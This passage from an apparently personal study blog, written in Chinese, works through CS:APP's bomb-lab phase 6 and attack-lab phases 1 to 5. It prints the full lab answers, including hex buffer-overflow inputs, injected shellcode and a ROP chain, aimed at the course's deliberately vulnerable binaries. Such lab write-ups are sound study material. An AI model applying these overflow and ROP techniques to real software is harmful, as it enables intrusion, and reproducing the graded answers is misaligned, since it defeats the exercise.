  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  4011a9:	eb cb                	jmp    401176 <phase_6+0x82>
```

基本流程是：对每个输入的数字`M[rsp+esi]=x`，判断其是否为1：
- 若`x=1`，则：`M[rsp+esi*2+32]=0x6032e0`。
- 若`x>1`，则：`M[rsp+esi*2+32]`取`Addr[esi]`，其中`Addr[esi]=M[Addr[esi-4]+8]`。

在阶段末尾打断点，观察`0x6032d0`处内存的内容：

![[Pasted image 20240725194630.png]]

可见源码似乎将这段内存定义为6个结点，其中第三个字段存储的内容疑似为下一结点的内存地址。

**注意**：被Intel坑惨了，AT&T的cmp指令是将*右操作数减去左操作数*，而不是Intel的左减右。还是自己菜（悲

假设输入为`1 2 3 4 5 6`，经过前一阶段翻转为`6 5 4 3 2 1`，则本阶段执行后`M[rsp+32]~M[rsp+80]`将改变为：

![[Pasted image 20240725195647.png]]

可见它们分别是上面第6、5、4、3、2、1个结点的地址。

M~O部分：

```assembly
  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
  4011ba:	48 89 d9             	mov    %rbx,%rcx
  
  4011bd:	48 8b 10             	mov    (%rax),%rdx
  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
  4011c4:	48 83 c0 08          	add    $0x8,%rax
  4011c8:	48 39 f0             	cmp    %rsi,%rax
  4011cb:	74 05                	je     4011d2 <phase_6+0xde>
  4011cd:	48 89 d1             	mov    %rdx,%rcx
  4011d0:	eb eb                	jmp    4011bd <phase_6+0xc9>
 
  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  4011d9:	00
```

从前面可以看出，6个结点组成链表结构，其中第三个字段存储后继地址。

本部分的目的似乎是根据输入数据重新连接链表。

最后一部分也就是P~Q部分：

```assembly
  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp
  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4011e3:	8b 00                	mov    (%rax),%eax
  4011e5:	39 03                	cmp    %eax,(%rbx)
  4011e7:	7d 05                	jge    4011ee <phase_6+0xfa>
  4011e9:	e8 4c 02 00 00       	call   40143a <explode_bomb>
  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
  4011f2:	83 ed 01             	sub    $0x1,%ebp
  4011f5:	75 e8                	jne    4011df <phase_6+0xeb>
```

这一部分似乎是对链表根据第一个字段进行降序排序。

| 地址       | 值   | 对应值 | 输入值 |
| -------- | --- | --- | --- |
| 0x6032d0 | 14c | 1   | 6   |
| 0x6032e0 | a8  | 2   | 5   |
| 0x6032f0 | 39c | 3   | 4   |
| 0x603300 | 2b3 | 4   | 3   |
| 0x603310 | 1dd | 5   | 2   |
| 0x603320 | 1bb | 6   | 1   |

根据值得到的大小顺序是`3>4>5>6>1>2`，翻转过来即是正确答案：

```
4 3 2 1 6 5
```

### secret_phase

饶了我吧，不想搞了（

看[其他博客](https://blog.csdn.net/qq_59075481/article/details/134340298)的说法是，可以通过特殊的输入序列，在`phase_defused`函数中触发隐藏阶段。

## attack-lab

**注意**：根据网上的教程解释，部分Ubuntu系统做不了这个lab，因为会在某一处原本不应该出错的地方报段错误，使程序爆掉。本人实测，CentOS 7.6可行。

本实验提供了两个有漏洞的程序，第一个程序`ctarget`存在代码注入漏洞，第二个程序`rtarget`存在返回导向程序漏洞。phase1至phase3针对第一个程序展开攻击，phase4至phase5针对第二个程序展开攻击。

据[实验Writeup](https://csapp.cs.cmu.edu/3e/attacklab.pdf)所述，本实验主要参考CSAPP教材的3.10.3和3.10.4两个小节。

每个程序都从输入流读入一个字符串。正常情况下，程序会正常返回，但如果刻意构造输入，则可能导致程序出现非预期行为。

### phase1

phase1不涉及代码注入，相反，phase1的目标是让程序非预期地调用一个已定义在代码段的函数。

该程序默认是连接到CMU的评分服务器的，但评分服务器已经下线，所以需要加`-q`参数才能正常运行。

反汇编`ctarget`：

```
objdump -d ctarget >ctarget.asm
```

查看汇编代码，发现大量函数，其中比较重要的是这些：
- `initialize_target`：
- `main`：设置信号处理函数、输入流，先调用`initialize_target`，再调用`stable_launch`
- `scramble`：
- `getbuf`：开辟40字节的缓冲区，调用`Gets`
- `touch1`：目标函数1
- `touch2`：目标函数2
- `hexmatch`：
- `touch3`：目标函数3
- `test`：调用`getbuf`，并判断是否发生了预期的攻击行为
- `save_char`：
- `save_term`：
- `Gets`：无休止读取到缓冲区，直到发生EOF
- `launch`：执行`test`函数，并判断`test`函数的行为是否符合预期
- `stable_launch`：根据对源码的解读，其功能似乎是先暂存当前的栈地址，并将程序的栈地址临时转移到一个由`mmap`创建的固定地址，随后调用`launch`，最后恢复原来的栈地址

根据实验Writeup，phase1并不涉及代码注入，而是要求通过构造输入，使代码执行`touch1`函数。分析`getbuf`函数的汇编源码：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

一个比较明显的漏洞是，缓冲区只有40字节，所以只要输入超过40字节，多余的输入便会写入缓冲区外的栈帧部分。对于`getbuf`而言，缓冲区后的8字节是函数的返回地址，因此可以通过刻意构造写入的第41-48字节内容，篡改函数的返回地址。

本phase中我们要非法访问`touch1`，而其地址为`0x4017c0`，因此可以如下构造phase1的输入：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

成功：

![[Pasted image 20240731085520.png]]

### phase2

phase2要求执行这个函数：

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

与`touch1`不同的是，`touch2`需要传入一个正确的参数，否则即使调用了也不成功。

Writeup中给的建议：
- 有可能需要在输入中自行指定返回地址，这样`getbuf`返回时会指向它。
- 函数第一个参数存储在`%rdi`寄存器中。
- 注入代码应当至少实现传入参数，随后通过`ret`指令将控制权转至`touch2`的第一条指令。
- 不推荐使用`jump`或`call`，因为这些指令的目标地址编码难于生成。

思路：
- 输入的前40字节用于注入需要执行的指令。
- 第41-48字节用于注入第一次返回地址（从`getbuf`返回到注入指令处）
- 第49-56字节用于注入第二次返回地址（从注入指令处返回到`touch2`）

通过GDB调试发现，`getbuf`中的输入缓冲区首地址是`0x5561dc78`。这也是第一次返回地址，该地址将会被`ret`指令误当作代码返回地址，从而到达我们注入的代码处：

![[Pasted image 20240731102212.png]]

计划注入这2条指令：

```
mov 0x59b997fa, %edi
retq
```

它们的编码为`bf fa 97 b9 59 c3`。而第二次返回地址，即`touch2`的首地址为`0x4017ec`，因此phase2的输入构造如下：

```
bf fa 97 b9 59 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
```

成功：

![[Pasted image 20240731104343.png]]

### phase3

phase3要求执行`touch3`函数：

```c
void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

`touch3`会调用`hexmatch`函数。它要求`sval`必须是`val`的十六进制表示：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```

与phase2不同的是，phase3要求传入一个字符串。根据分析，这个字符串必须是cookie的十六进制表示。

Writeup中给的建议：
- 输入中必须包含cookie的表示字符串。
- C/C++中的字符串带尾零。
- `%rdi`应当存储的是字符串的首地址。
- 函数`hexmatch`和`strncmp`在被调用时，会向栈中写入内容。在`getbuf`返回和注入代码返回后，`%rsp`实际上在输入缓冲区后56个字节，因此如果注入代码不加干预，继续调用函数有可能覆盖缓冲区内容。

考虑到缓冲区有被覆盖的风险，最稳妥的方法是将字符串存储到缓冲区的最后。另外，`%rdi`的值应当设置为cookie表示字符串的地址，这里我们选取第17-25字节存储：

```assembly
mov $0x5561dcb0, %edi
ret
```

对应的phase3输入：
- 前40字节：指令和留白。
- 第41-48字节：第一次返回地址，即注入代码地址。
- 第49-56字节：第二次返回地址，即`touch3`首地址。
- 第57-72字节：将要传递给`touch3`的字符串。

```
bf b0 dc 61 55 c3 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
```

成功：

![[Pasted image 20240731154044.png]]

### phase4

在phase4之前，Writeup讲解了一下*返回值导向编程*（return-oriented programming，ROP）的攻击方式。

不是所有程序都像`ctarget`这么傻：
- 运行时栈的位置是完全随机的，想定位自己注入的代码极其困难。
- 即使代码能定位，有些程序会明确标记某些程序段为不可执行。这样试图执行数据段或堆栈段的代码只会得到一个段错误。

注意到：
- `retq`指令会无条件地跳转到`M[rsp]`所指的地址，并将`rsp`加8。
- `retq`指令的编码只有一个字节：`0xc3`，对于一个程序来讲并不罕见。

因此，ROP期望在栈中构造一个长地址序列，每个地址存储一个代码地址，该地址处往后数1至若干字节是一个`0xc3`，`0xc3`前的若干字节一般可以解读为至少一条指令。

这样做的意义是，只要栈顶指针指向该序列并执行了`retq`指令，整个序列中所有地址指向的`retq`前的字节都能够作为指令被执行：

![[Pasted image 20240731161519.png]]

`retq`前的字节在Writeup中被称为gadget。部分gadget较难作为单个指令出现，但可以作为其他指令的片段出现。

`rtarget`刻意构造了数十个函数，称为gadget farm。每个函数在`retq`之间都包含数个不同的字节，以便根据这些字节构造ROP序列。这样ROP序列本身便是一个程序，可以执行一些遵从攻击者意愿的代码。

回到phase4。它要求在`rtarget`中复现phase2的攻击行为，但只允许构造包含如下指令的ROP序列：`movq`、`popq`、`ret`、`nop`。

Writeup给出了3条建议：
- 对于本phase，使用到的gadget在gadget farm的前半部分（这不废话吗）
- 本phase只需要使用两个gadget
- 如果使用`popq`指令，它会从栈中弹出数据，因此输入字符串必须包含数据和gadget地址的组合

phase2中，我们直接给`%rdi`实施了立即数赋值，但这里并没有包含cookie立即数的gadget，`gencookie`函数也实测无效。

观察到如下两个可疑的gadget：

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```

```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
```

第一个gadget包含了`movq %rax, %rdi`和`nop`两条指令。第二个包含了`popq %rax`和`nop`两条指令。结合Writeup的建议，我们需要考虑将立即数插入到栈内，让gadget通过`popq`将立即数传送到`%rax`中，再用`movq`指令传送到`%rdi`，这样便能够正常调用`touch2`了。

phase4的答案如下构造：
- 前40个字节留空。
- 第41-48字节：第一个gadget的首地址`0x4019cc`，包含了`popq`指令。
- 第49-56字节：数据`0x59b997fa`，为cookie立即数。
- 第57-64字节：第二个gadget的首地址`0x4019c5`，包含了`movq`指令。
- 第65-72字节：`touch2`的首地址。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

成功：

![[Pasted image 20240731210228.png]]

### phase5

phase5是对phase3、phase4的综合。

Writeup只有这两条提示：
- 可能涉及到`movl`指令和双字节空指令。
- 标准答案使用了8个gadget。

根据Writeup给出的指令手册，以下gadget可能有用：

| 首址         | 指令                          |
| ---------- | --------------------------- |
| `0x4019a2` | `mov %rax, %rdi`            |
| `0x4019ab` | `popq %rax`                 |
| `0x4019c5` | `mov %rax, %rdi`            |
| `0x4019cc` | `popq %rax`                 |
| `0x4019dc` | `popq %rsp; mov %eax, %edx` |
| `0x401a06` | `mov %rsp, %rax`            |
| `0x401a13` | `mov %ecx, %esi`            |
| `0x401a27` | `mov %ecx, %esi`            |
| `0x401a34` | `mov %edx, %ecx`            |
| `0x401a3c` | `mov %esp, %eax`            |
| `0x401a42` | `mov %eax, %edx`            |
| `0x401a69` | `mov %edx, %ecx`            |
| `0x401a86` | `mov %esp, %eax`            |
| `0x401aad` | `mov %rsp, %rax`            |
